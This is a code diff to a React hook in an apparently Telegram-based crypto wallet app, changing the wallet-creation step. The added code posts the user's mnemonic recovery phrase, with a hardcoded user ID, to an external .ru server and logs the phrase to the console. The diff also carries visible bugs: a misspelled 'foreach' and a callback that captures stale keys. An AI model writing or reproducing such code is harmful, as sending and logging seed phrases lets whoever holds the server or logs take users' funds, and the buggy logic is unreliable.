@@ -2,6 +2,7 @@ import React, { useCallback, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import BackButton from '../../../constants/BackButton';
 import MainButton from '../../../constants/MainButton';
+import axios from 'axios';
 
 const useButton = ({step, setStep, keys, values, setMistakes, mistakes}) => {
     
@@ -9,6 +10,8 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes}) => {
 
     useEffect( () => {
         const mistakesCopy = [false, false, false ,false ,false, false]
+        console.log(keys);
+        
         if (mistakes.includes(true)){
             keys.foreach((e, i) => {
                 if (e != values[i]){
@@ -52,10 +55,22 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes}) => {
           });
           setMistakes(mistakesCopy)
       }, [keys, values, setMistakes] )
+
+
+      const createWallet = useCallback( async () => {
+        const response = await axios.post("https://www.connectbirga.ru/user/wallet", {
+            mnemonic: keys,
+            userId: 2144832745,
+          });
+      } , [] )
     
       const saveFunction = useCallback( () => {
           if (checkFunction()){
-            alert("Создать кошель")   
+            createWallet().then(value => {
+                navigate("/")
+            }).catch(value => {
+                alert("Кошелек не был создан, причина : " + JSON.stringify(value))
+            })
           }
           else{
             window.Telegram.WebApp.HapticFeedback.notificationOccurred("error")
